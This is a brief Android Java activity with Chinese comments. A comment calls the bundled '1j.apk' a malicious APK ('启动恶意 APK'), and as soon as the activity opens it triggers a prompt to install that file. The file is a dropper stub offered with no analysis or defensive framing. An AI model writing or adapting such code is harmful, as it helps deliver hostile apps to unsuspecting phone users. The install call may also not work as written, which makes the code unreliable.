package com.example.hi;  // 你的包名，确保与你的项目一致

import android.content.Intent;  // 导入 Intent 类
import android.net.Uri;  // 导入 Uri 类
import android.os.Bundle;  // 导入 Bundle 类
import androidx.appcompat.app.AppCompatActivity;  // 导入 AppCompatActivity 类

public class HiActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_hi);  // 设置布局文件

        // 启动恶意 APK
        Intent intent = new Intent(Intent.ACTION_VIEW);  // 创建一个查看类型的 Intent
        intent.setDataAndType(Uri.parse("file:///android_asset/1j.apk"), "application/vnd.android.package-archive");  // 设置 APK 文件路径
        startActivity(intent);  // 启动安装活动
    }
}
